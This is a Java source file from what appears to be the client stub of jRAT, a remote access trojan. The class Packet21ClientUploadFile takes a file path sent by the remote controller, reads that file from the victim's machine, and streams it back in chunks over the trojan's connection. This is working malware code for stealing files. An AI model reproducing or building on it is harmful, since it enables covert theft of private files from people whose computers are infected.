package se.jrat.stub.packets.incoming;

import java.io.File;
import java.io.FileInputStream;

import se.jrat.common.TransferRunnable;
import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
import se.jrat.stub.packets.outgoing.Packet29ClientUploadPart;
import se.jrat.stub.packets.outgoing.Packet30BeginClientUpload;
import se.jrat.stub.packets.outgoing.Packet31CompleteClientUpload;


public class Packet21ClientUploadFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		final String rawFile = Connection.instance.readLine();
		final File file = new File(rawFile);

		if (file.exists() && file.isFile()) {			
			Connection.instance.addToSendQueue(new Packet30BeginClientUpload(file));

			TransferData data = new TransferData();
			data.setLocalFile(file);
			data.setRunnable(new TransferRunnable(data) {
				@Override
				public void run() {
					try {			
						FileInputStream fileInput = new FileInputStream(file);
						byte[] chunk = new byte[1024 * 8];

						int read;
						while ((read = fileInput.read(chunk)) != -1) {
							if (pause) {
								try {
									Thread.sleep(Long.MAX_VALUE);
								} catch (InterruptedException e) {

								}
							}
							
							if (Thread.interrupted()) {
								fileInput.close();
								return;
							}
							
							AbstractOutgoingPacket packet = new Packet29ClientUploadPart(rawFile, chunk, read);
							Connection.instance.addToSendQueue(packet);
						}
						fileInput.close();
						
						Connection.instance.addToSendQueue(new Packet31CompleteClientUpload(rawFile));
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			});
			data.start();
			
			FileCache.put(file, data);
		}
	}

}
